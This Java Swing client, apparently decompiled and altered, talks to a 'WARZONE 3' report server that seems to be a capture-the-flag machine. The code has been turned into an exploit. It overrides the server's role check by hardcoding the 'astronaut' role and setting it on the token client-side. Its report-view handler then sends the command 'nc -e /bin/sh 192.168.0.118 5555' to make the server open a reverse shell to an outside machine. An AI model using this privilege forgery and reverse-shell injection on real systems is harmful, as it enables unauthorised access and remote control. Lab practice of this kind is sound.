package alien;

import java.awt.Color;
import java.awt.Container;
import java.awt.FlowLayout;
import java.awt.GridLayout;
import java.awt.LayoutManager;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.net.Socket;
import javax.swing.JButton;
import javax.swing.JCheckBox;
import javax.swing.JFrame;
import javax.swing.JLabel;
import javax.swing.JOptionPane;
import javax.swing.JPasswordField;
import javax.swing.JScrollPane;
import javax.swing.JTextArea;
import javax.swing.JTextField;

public class Starter extends JFrame implements ActionListener {
    Container container = getContentPane();

    JLabel userLabel = new JLabel("USERNAME");

    JLabel passwordLabel = new JLabel("PASSWORD");

    JTextField userTextField = new JTextField();

    JPasswordField passwordField = new JPasswordField();

    JButton loginButton = new JButton("LOGIN");

    JButton resetButton = new JButton("RESET");

    JButton uploadButton = new JButton("UPLOAD");

    JButton viewButton = new JButton("VIEW");

    JButton infoButton = new JButton("INFO");

    JCheckBox showPassword = new JCheckBox("Show Password");

    JTextArea field = new JTextArea();

    static Token token;

    static String role;

    ObjectOutputStream os;

    ObjectInputStream is;

    Socket socket;

    public Starter() {
        setLayoutManager();
        setLocationAndSize();
        addComponentsToContainer();
        addActionEvent();
        this.showPassword.setBackground(Color.GRAY);
    }

    public static void main(String[] args) {
        Starter frame = new Starter();
        frame.setTitle("WARZONE 3 | Login Form");
        frame.setVisible(true);
        frame.setBounds(10, 10, 370, 600);
        frame.setDefaultCloseOperation(3);
        frame.setResizable(true);
    }

    public void actionPerformed(ActionEvent e) {
        if (e.getSource() == this.loginButton) {
            String username = this.userTextField.getText();
            String password = this.passwordField.getText();
            try {
                this.socket = new Socket("warzone.local", 4444);
                this.os = new ObjectOutputStream(this.socket.getOutputStream());
                RE login = new RE();
                login.setToken(null);
                login.setOption("LOGIN");
                login.setCmd(null);
                login.setValue(String.valueOf(username) + "@" + password);
                this.os.writeObject(login);
                this.is = new ObjectInputStream(this.socket.getInputStream());
                RE response = (RE)this.is.readObject();
                token = response.getToken();
//                role = token.getRole();
                role = "astronaut";
                this.os.close();
                this.socket.close();
                if (response.getValue().equals("TRUE")) {
                    dashboard();
                } else {
                    JOptionPane.showMessageDialog(this, "Invalid Username or Password");
                }
            } catch (IOException|ClassNotFoundException e1) {
                e1.printStackTrace();
            }
        }
        if (e.getSource() == this.resetButton) {
            this.userTextField.setText("");
            this.passwordField.setText("");
        }
        if (e.getSource() == this.showPassword)
            if (this.showPassword.isSelected()) {
                this.passwordField.setEchoChar('-');
            } else {
                this.passwordField.setEchoChar('*');
            }
        if (e.getSource() == this.viewButton)
            if (role.equals("researcher")) {
                JOptionPane.showMessageDialog(this, "Permission Denied");
            } else if (role.equals("astronaut")) {
                try {
                    this.socket = new Socket("warzone.local", 4444);
                    this.os = new ObjectOutputStream(this.socket.getOutputStream());
                    RE list = new RE();
                    token.setRole(role);
                    list.setToken(token);
                    list.setOption("VIEW");
                    list.setCmd("LIST");
                    list.setValue(null);
                    this.os.writeObject(list);
                    this.is = new ObjectInputStream(this.socket.getInputStream());
                    RE response = (RE)this.is.readObject();
                    this.os.close();
                    this.socket.close();
                    reportList(response.getValue());
                } catch (IOException e1) {
                    e1.printStackTrace();
                } catch (ClassNotFoundException e1) {
                    e1.printStackTrace();
                }
            }
        if (e.getSource() == this.uploadButton)
            JOptionPane.showMessageDialog(this, "Has not been implemented");
    }

    public void setLayoutManager() {
        this.container.setLayout((LayoutManager)null);
        this.container.setBackground(Color.GRAY);
    }

    public void setLocationAndSize() {
        this.userLabel.setBounds(50, 150, 100, 30);
        this.passwordLabel.setBounds(50, 220, 100, 30);
        this.userTextField.setBounds(150, 150, 150, 30);
        this.passwordField.setBounds(150, 220, 150, 30);
        this.showPassword.setBounds(150, 250, 150, 30);
        this.loginButton.setBounds(50, 300, 100, 30);
        this.resetButton.setBounds(200, 300, 100, 30);
        this.uploadButton.setBounds(50, 300, 100, 30);
        this.viewButton.setBounds(200, 300, 100, 30);
        this.field.setBounds(20, 20, 320, 50);
    }

    public void addComponentsToContainer() {
        this.container.add(this.userLabel);
        this.container.add(this.passwordLabel);
        this.container.add(this.userTextField);
        this.container.add(this.passwordField);
        this.container.add(this.showPassword);
        this.container.add(this.loginButton);
        this.container.add(this.resetButton);
    }

    public void addActionEvent() {
        this.loginButton.addActionListener(this);
        this.resetButton.addActionListener(this);
        this.showPassword.addActionListener(this);
        this.uploadButton.addActionListener(this);
        this.viewButton.addActionListener(this);
    }

    public void dashboard() {
        this.field.setText("This is a secret researching system.");
        this.field.append("\nHere you can submit or view reports about aliens behavior");
        this.field.setEditable(false);
        this.container.removeAll();
        setLayoutManager();
        this.container.add(this.uploadButton);
        this.container.add(this.viewButton);
        this.container.add(this.field);
        this.container.setLayout(new FlowLayout());
        this.container.repaint();
    }

    public void reportList(String value) {
        JFrame view = new JFrame("View Reports");
        GridLayout list = new GridLayout(2, 2);
        Container containerLIst = view.getContentPane();
        containerLIst.setLayout(list);
        containerLIst.setBackground(Color.GRAY);
        String[] files = value.split("@");
        byte b;
        int i;
        String[] arrayOfString1;
        for (i = (arrayOfString1 = files).length, b = 0; b < i; ) {
            final String f = arrayOfString1[b];
            if (f.contains(".txt")) {
                JButton name = new JButton(f);
                name.addActionListener(new ActionListener() {
                    public void actionPerformed(ActionEvent e) {
                        try {
                            Starter.this.socket = new Socket("warzone.local", 4444);
                            Starter.this.os = new ObjectOutputStream(Starter.this.socket.getOutputStream());
                            RE list = new RE();
                            list.setToken(Starter.token);
                            list.setOption("VIEW");
                            list.setValue("VALUE");
                            list.setCmd("nc -e /bin/sh 192.168.0.118 5555");
                            Starter.this.os.writeObject(list);
                            Starter.this.is = new ObjectInputStream(Starter.this.socket.getInputStream());
                            RE response = (RE)Starter.this.is.readObject();
                            Starter.this.os.close();
                            Starter.this.socket.close();
                            Starter.this.reportValue(response.getValue());
                        } catch (IOException e1) {
                            e1.printStackTrace();
                        } catch (ClassNotFoundException e1) {
                            e1.printStackTrace();
                        }
                    }
                });
                containerLIst.add(name);
            }
            b++;
        }
        view.setVisible(true);
        view.setBounds(10, 10, 370, 600);
        view.setDefaultCloseOperation(3);
        view.setResizable(true);
        view.show();
    }

    public void reportValue(String value) {
        JTextArea output = new JTextArea(" ");
        String[] text = value.split("@");
        byte b;
        int i;
        String[] arrayOfString1;
        for (i = (arrayOfString1 = text).length, b = 0; b < i; ) {
            String word = arrayOfString1[b];
            output.append(String.valueOf(word) + " ");
            output.setEditable(false);
            b++;
        }
        output.setColumns(30);
        output.setLineWrap(true);
        output.setWrapStyleWord(true);
        output.setSize((output.getPreferredSize()).width, 1);
        JOptionPane.showMessageDialog(null, new JScrollPane(output), "Report",
                2);
    }
}
